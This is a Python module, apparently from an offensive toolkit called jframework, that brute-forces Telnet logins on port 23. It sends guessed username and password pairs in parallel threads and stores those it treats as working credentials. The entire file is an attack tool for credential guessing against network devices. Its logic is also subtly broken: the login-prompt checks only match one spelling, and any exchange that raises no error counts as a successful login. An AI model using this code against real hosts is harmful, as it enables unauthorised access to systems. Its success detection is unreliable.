from jframework.modules.login._bruteforce import _Bruteforce
import sys
import telnetlib


class Telnetbruteforce(_Bruteforce):

    def __init__(self):
        super(Telnetbruteforce, self).__init__()
        self.single_port = 23

    def worker(self, user, password):
        try:
            tn = telnetlib.Telnet(host=self.host, port=self.single_port, timeout=2)
            tn.read_until((b"login: " or b"Login: " ))
            tn.write(user.encode("ascii") + b"\n")
            tn.read_until((b"Password: " or b"password: "))
            tn.write(password.encode("ascii") + b"\n")
            tn.write(b"dir\n")
            tn.write(b"exit\n")
            tn.read_all()
            tn.close()
            self.print_result(user, password, error=False)
            self.lock.acquire()
            self.add_credential(user, password, "telnet")
            self.lock.release()
        except:
            if (self.verb):
                self.print_result(user, password, error=True)
            try:
                tn.close()
            except:
                pass
        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        try:
            tn = telnetlib.Telnet(host=self.host, port=self.single_port, timeout=3)
            resp = tn.expect([b"login: ", b"Login: "], 3)
            tn.close()
            if resp[1] is None:
                raise Exception
        except Exception as e:
            if("timed out" in str(e)):
                print("No service found")
            else:
                print("It doesn't work with that kind of telnet")
            return None, None

        super(Telnetbruteforce, self).run()

        return self.sessions, self.credentials